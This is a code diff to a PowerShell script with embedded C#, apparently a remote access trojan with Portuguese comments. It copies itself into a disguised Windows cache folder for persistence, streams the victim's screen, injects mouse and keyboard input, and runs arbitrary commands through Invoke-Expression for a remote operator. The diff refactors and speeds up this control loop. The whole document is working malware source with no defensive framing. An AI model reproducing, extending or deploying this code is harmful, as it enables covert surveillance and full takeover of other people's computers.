@@ -15,7 +15,7 @@ if (-not $isAdmin) {
     exit
 }
 
-# ===== PERSISTÊNCIA BLINDADA =====
+# ===== PERSISTÊNCIA =====
 $scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
 New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force -ErrorAction SilentlyContinue | Out-Null
 try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
@@ -35,17 +35,11 @@ if (-not ("R9KCore" -as [type])) {
     using System.Windows.Forms;
 
     public class R9KCore {
-        [DllImport("user32.dll")]
-        public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
-        [DllImport("user32.dll")]
-        public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
-        [DllImport("user32.dll")]
-        public static extern bool ClipCursor(IntPtr lpRect);
-        
-        [StructLayout(LayoutKind.Sequential)]
-        public struct RECT { public int Left, Top, Right, Bottom; }
-        [DllImport("user32.dll")]
-        public static extern bool ClipCursor(ref RECT lpRect);
+        [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
+        [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
+        [DllImport("user32.dll")] public static extern bool ClipCursor(IntPtr lpRect);
+        [StructLayout(LayoutKind.Sequential)] public struct RECT { public int Left, Top, Right, Bottom; }
+        [DllImport("user32.dll")] public static extern bool ClipCursor(ref RECT lpRect);
 
         public static string CaptureScreen(int maxW, long quality) {
             try {
@@ -71,6 +65,33 @@ if (-not ("R9KCore" -as [type])) {
                     }
                 }
             } catch { return null; }
+        }
+
+        public static void HandleInput(string cmd) {
+            try {
+                if (cmd.StartsWith("move ")) {
+                    string[] p = cmd.Split(' ');
+                    if (p.Length >= 3) {
+                        int nx = int.Parse(p[1]);
+                        int ny = int.Parse(p[2]);
+                        int px = (int)((nx / 65535.0) * Screen.PrimaryScreen.Bounds.Width);
+                        int py = (int)((ny / 65535.0) * Screen.PrimaryScreen.Bounds.Height);
+                        Cursor.Position = new Point(px, py);
+                    }
+                }
+                else if (cmd == "md 1") mouse_event(0x0002, 0,0,0,0);
+                else if (cmd == "mu 1") mouse_event(0x0004, 0,0,0,0);
+                else if (cmd == "md 2") mouse_event(0x0008, 0,0,0,0);
+                else if (cmd == "mu 2") mouse_event(0x0010, 0,0,0,0);
+                else if (cmd == "md 3") mouse_event(0x0020, 0,0,0,0);
+                else if (cmd == "mu 3") mouse_event(0x0040, 0,0,0,0);
+                else if (cmd.StartsWith("mw ")) {
+                    int d = int.Parse(cmd.Substring(3));
+                    mouse_event(0x0800, 0,0,(uint)d,0);
+                }
+                else if (cmd.StartsWith("kd ")) keybd_event(byte.Parse(cmd.Substring(3)), 0, 0, UIntPtr.Zero);
+                else if (cmd.StartsWith("ku ")) keybd_event(byte.Parse(cmd.Substring(3)), 0, 2, UIntPtr.Zero);
+            } catch {}
         }
 
         public static void LockMouse() {
@@ -113,58 +134,35 @@ while ($true) {
                 if ([string]::IsNullOrEmpty($cmd)) { continue }
                 $cmd = $cmd.Trim()
 
+                # Comandos de sistema
                 if ($cmd -eq 'stream_start') { $streaming = $true; continue }
                 if ($cmd -eq 'stream_stop') { $streaming = $false; $writer.WriteLine("STREAM_STOPPED"); continue }
                 if ($cmd -eq 'exit') { throw "exit" }
-
-                $parts = $cmd -split ' ', 2
-                $verb = $parts[0]
-                $arg  = if ($parts.Count -gt 1) { $parts[1] } else { '' }
-
-                $response = ""
-                switch ($verb) {
-                    'screenshot' {
-                        $b64 = [R9KCore]::CaptureScreen(1920, 85)
-                        if ($b64) { $writer.WriteLine("SCREEN:$b64") } else { $writer.WriteLine("SCREEN_ERROR") }
-                    }
-                    'move' {
-                        $xy = $arg -split '\s+'
-                        if ($xy.Count -eq 2) {
-                            $nx = [int]$xy[0]; $ny = [int]$xy[1]
-                            $px = [int](($nx / 65535) * $bounds.Width); $py = [int](($ny / 65535) * $bounds.Height)
-                            [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($px, $py)
-                        }
-                    }
-                    'md' {
-                        if ($arg -eq '1') { [R9KCore]::mouse_event(0x0002, 0,0,0,0) }
-                        elseif ($arg -eq '2') { [R9KCore]::mouse_event(0x0008, 0,0,0,0) }
-                        elseif ($arg -eq '3') { [R9KCore]::mouse_event(0x0020, 0,0,0,0) }
-                    }
-                    'mu' {
-                        if ($arg -eq '1') { [R9KCore]::mouse_event(0x0004, 0,0,0,0) }
-                        elseif ($arg -eq '2') { [R9KCore]::mouse_event(0x0010, 0,0,0,0) }
-                        elseif ($arg -eq '3') { [R9KCore]::mouse_event(0x0040, 0,0,0,0) }
-                    }
-                    'mw' { [R9KCore]::mouse_event(0x0800, 0,0,[uint32][int]$arg,0) }
-                    'kd' { [R9KCore]::keybd_event([byte][int]$arg, 0, 0, [UIntPtr]::Zero) }
-                    'ku' { [R9KCore]::keybd_event([byte][int]$arg, 0, 2, [UIntPtr]::Zero) }
-                    'lock_mouse' { [R9KCore]::LockMouse(); $response = "MOUSE_LOCKED" }
-                    'unlock_mouse' { [R9KCore]::UnlockMouse(); $response = "MOUSE_UNLOCKED" }
-                    'ping' { $response = "PONG" }
-                    'exec' { try { $response = Invoke-Expression $arg 2>&1 | Out-String } catch { $response = "EXEC_ERR" } }
-                    default { $response = "UNKNOWN: $verb" }
+                if ($cmd -eq 'lock_mouse') { [R9KCore]::LockMouse(); $writer.WriteLine("MOUSE_LOCKED"); continue }
+                if ($cmd -eq 'unlock_mouse') { [R9KCore]::UnlockMouse(); $writer.WriteLine("MOUSE_UNLOCKED"); continue }
+                if ($cmd -eq 'ping') { $writer.WriteLine("PONG"); continue }
+                if ($cmd -eq 'screenshot') {
+                    $b64 = [R9KCore]::CaptureScreen(1920, 85)
+                    if ($b64) { $writer.WriteLine("SCREEN:$b64") }
+                    continue
                 }
-                if ($response) { $writer.WriteLine($response) }
+                if ($cmd.StartsWith('exec ')) {
+                    try { $writer.WriteLine((Invoke-Expression ($cmd.Substring(5)) 2>&1 | Out-String)) } catch { $writer.WriteLine("EXEC_ERR") }
+                    continue
+                }
+
+                # Envia mouse/teclado direto pro C# (Ultra rápido)
+                [R9KCore]::HandleInput($cmd)
             } else {
-                Start-Sleep -Milliseconds 10
+                Start-Sleep -Milliseconds 5
             }
 
             if ($streaming -and $client.Connected) {
-                $b64 = [R9KCore]::CaptureScreen(1024, 30) # Qualidade e tamanho reduzidos pra acabar com o lag
+                $b64 = [R9KCore]::CaptureScreen(1024, 30) 
                 if ($b64) {
                     try { $writer.WriteLine("SCREEN:$b64") } catch { break }
                 }
-                Start-Sleep -Milliseconds 100 # Delay maior pra aliviar a rede
+                Start-Sleep -Milliseconds 40 # Loop mais rápido de tela
             }
         }
     } catch {} finally {
